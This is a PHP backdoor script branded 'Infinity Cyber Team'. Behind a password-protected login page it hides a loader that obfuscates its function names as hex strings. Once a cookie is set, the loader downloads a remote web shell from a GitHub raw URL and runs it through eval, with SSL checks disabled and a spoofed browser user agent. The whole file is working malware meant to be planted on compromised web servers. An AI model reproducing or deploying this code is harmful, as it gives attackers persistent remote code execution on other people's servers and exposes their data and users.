<?php
// This script is part of Infinity Cyber Team (CUC) - Best Script.
// 
// CUC - Best Script is free software: you can redistribute it and/or modify
// it under the terms of The PHP License, version 3.01.
// 
// CUC - Best Script is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See
// The PHP License for more details.
// 
// You should have received a copy of The PHP License, version 3.01,
// along with CUC - Best Script. If not, see <https://www.php.net/license/3_01.txt>.

/**
 * Infinity Cyber Team (CUC) - Best Script
 * @link https://cuc.dev/
 * @author CUC.
 * @since 17. 7. 1337 - time 13:37
 * @package CUCGroup
 * @license https://www.php.net/license/3_01.txt The PHP License, version 3.01
 * @version 1.7
 * @copyright  Copyright (C) 1337 CUC, Inc. All rights reserved.
 */

function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
    }
    return $str;
}

// @deprecated  1.0  Deprecated without replacement
function is_logged_in()
{
    return isset($_COOKIE['coxphe']) && $_COOKIE['coxphe'] === 'coxphe'; 
}

if (is_logged_in()) {
    $Array = array(
        '666f70656e',                   # fo p en => 0
        '73747265616d5f6765745f636f6e74656e7473', # strea m_get_contents => 1
        '66696c655f6765745f636f6e74656e7473', # fil e_g et_cont ents => 2
        '6375726c5f65786563',           # cur l_ex ec => 3
        '636f7079',                     # co p y => 4
        '73747265616d5f636f6e74657874', # strea m_con t ex t_cr ea te => 5
        '66696c65'                      # fi l e => 6
    );
    
    function geturlsinfo($b0rn) {
        $l1v3 = array(
            hex2str($GLOBALS['Array'][0]), 
            hex2str($GLOBALS['Array'][1]), 
            hex2str($GLOBALS['Array'][2]), 
            hex2str($GLOBALS['Array'][3]),
            hex2str($GLOBALS['Array'][4]),
            hex2str($GLOBALS['Array'][5]),
            hex2str($GLOBALS['Array'][6])
        );
    
        if (function_exists($l1v3[3])) { 
            $ch = curl_init($b0rn);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            $d34th = $l1v3[3]($ch);
            curl_close($ch);
            return $d34th;
        } elseif (function_exists($l1v3[2])) { 
            return $l1v3[2]($b0rn);
        } elseif (function_exists($l1v3[0]) && function_exists($l1v3[1])) { 
            $g04l = $l1v3[0]($b0rn, "r");
            $d34th = $l1v3[1]($g04l);
            fclose($g04l);
            return $d34th;
        } elseif (function_exists($l1v3[4])) {
            return $l1v3[4]($b0rn, '/tmp/tempfile');
        } elseif (function_exists($l1v3[5])) {
            $context = $l1v3[5](array('http' => array('timeout' => 5)));
            return file_get_contents($b0rn, false, $context);
        } elseif (function_exists($l1v3[6])) {
            return implode('', $l1v3[6]($b0rn));
        }
        return false;
    }    

    $b0rn = 'https://raw.githubusercontent.com/mirebus66/lp/main/alfa';
    $dr34m = geturlsinfo($b0rn);
    if ($dr34m !== false) {
        eval('?>' . $dr34m); 
    } 
} else { 
    if (isset($_POST['password'])) { 
        $entered_key = $_POST['password']; 
        $hashed_key = '$2y$10$SGG8DHNj2omh5MXNehg3m.f77uiOkRkXIOS.1KBRJEAGA4dvmMH6i'; // https://bcrypt.online/ 
        if (password_verify($entered_key, $hashed_key)) { 
            setcookie('coxphe', 'coxphe', time() + 3600, '/'); 
            header("Location: ".$_SERVER['PHP_SELF']); 
            exit(); 
        } 
    } 
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow, noarchive">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link rel="icon" href="https://scontent-cgk1-2.xx.fbcdn.net/v/t1.6435-9/87048302_531940970782738_2954240718513635328_n.jpg?_nc_cat=111&ccb=1-7&_nc_sid=833d8c&_nc_ohc=_EWNS6bSKKoQ7kNvwEfUSs3&_nc_oc=Adn3MYTcV3vxems7t5i1wI0AG7NVyWpGQWT-zAVL7KBVJUd1NSkMIkcf1UI25B__v4c&_nc_zt=23&_nc_ht=scontent-cgk1-2.xx&_nc_gid=QYzDjFjcyfzszAUBzPwYLg&oh=00_AfHT6K2KuVsMqEPKpjYB0u6zONHWT6HegrWK0-fb4zR5bQ&oe=68393A0A">
    <link href="https://fonts.googleapis.com/css2?family=Cinzel&display=swap" rel="stylesheet">
    <title></title>
    <style>
      body {
        margin: 0;
        padding: 0;
        font-family: "Cinzel", serif;
        background-color: #000000;
        color: #cf1018;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh; /* Full viewport height */
        text-align: center;
      }

      .container {
        max-width: 800px;
        width: 100%;
        padding: 20px;
      }

      h1,
      p,
      a {
        color: #cf1018;
      }

      img {
        display: block;
        margin: 20px auto;
        max-width: 100%;
        cursor: pointer;
      }

      /* Style for the password input */
      input[type="password"] {
        padding: 10px;
        border: 2px solid #cf1018;
        border-radius: 5px;
        background-color: #000000;
        color: #cf1018;
        font-family: "Cinzel", serif;
        font-size: 16px;
        outline: none;
        width: 50%;
        max-width: 300px;
        margin: 10px auto;
      }

      /* Style for the submit button */
      input[type="submit"] {
        padding: 10px 20px;
        border: none;
        border-radius: 5px;
        background-color: #cf1018;
        color: #000000;
        font-family: "Cinzel", serif;
        font-size: 16px;
        cursor: pointer;
        transition: background-color 0.3s ease;
        width: 50%;
        max-width: 300px;
        margin: 10px auto;
      }

      /* Hover effect for the submit button */
      input[type="submit"]:hover {
        background-color: #a00d14;
      }
    </style>
    <script>
      document.addEventListener("DOMContentLoaded", function() {
        document.getElementById("clickableImage").addEventListener("click", function() {
          var linkContainer = document.getElementById("linkContainer");
          if (!linkContainer.innerHTML) { // Check if links are not already added
            linkContainer.innerHTML = `<center>
      <form method="POST" action="">
      <input type="password" id="password" name="password" placeholder="enter password here." required>
      <input type="submit" value="access!">
    </form>
    </center>`;
          }
        });
      });
    </script>
  </head>
  <body>
    <div class="container">
      <img id="clickableImage" src="https://scontent-cgk1-2.xx.fbcdn.net/v/t1.6435-9/87048302_531940970782738_2954240718513635328_n.jpg?_nc_cat=111&ccb=1-7&_nc_sid=833d8c&_nc_ohc=_EWNS6bSKKoQ7kNvwEfUSs3&_nc_oc=Adn3MYTcV3vxems7t5i1wI0AG7NVyWpGQWT-zAVL7KBVJUd1NSkMIkcf1UI25B__v4c&_nc_zt=23&_nc_ht=scontent-cgk1-2.xx&_nc_gid=QYzDjFjcyfzszAUBzPwYLg&oh=00_AfHT6K2KuVsMqEPKpjYB0u6zONHWT6HegrWK0-fb4zR5bQ&oe=68393A0A" width="500px" alt="Infinity Cyber Team">
      <div id="linkContainer"></div>
      <p>~ Infinity Cyber Team ~</p>
    </div>
  </body>
</html>
<?php } ?>
